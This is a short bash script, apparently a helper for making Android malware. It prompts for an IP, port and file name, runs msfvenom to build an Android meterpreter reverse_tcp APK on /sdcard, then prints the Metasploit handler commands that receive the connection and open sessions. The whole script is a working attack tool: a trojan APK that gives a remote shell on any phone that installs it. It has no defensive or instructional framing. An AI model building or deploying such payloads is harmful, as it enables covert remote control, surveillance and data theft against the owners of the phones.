#!/bin/bash

# Display local IP addresses
cd /root
clear
ifconfig

# User input for payload configuration
read -p "Enter payload IP: " n1
read -p "Enter payload port: " n2
read -p "Enter payload name: " n3

# Generate Metasploit payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=$n1 LPORT=$n2 -o "/sdcard/$n3.apk"
clear
# Display Metasploit commands
echo "msfconsole"

echo "use exploit/multi/handler"
echo "set payload android/meterpreter/reverse_tcp"

echo "set LHOST $n1"
echo "set LPORT $n2"


echo "              #<=run payload=>#    "


echo "exploit -j"
echo "sessions -i"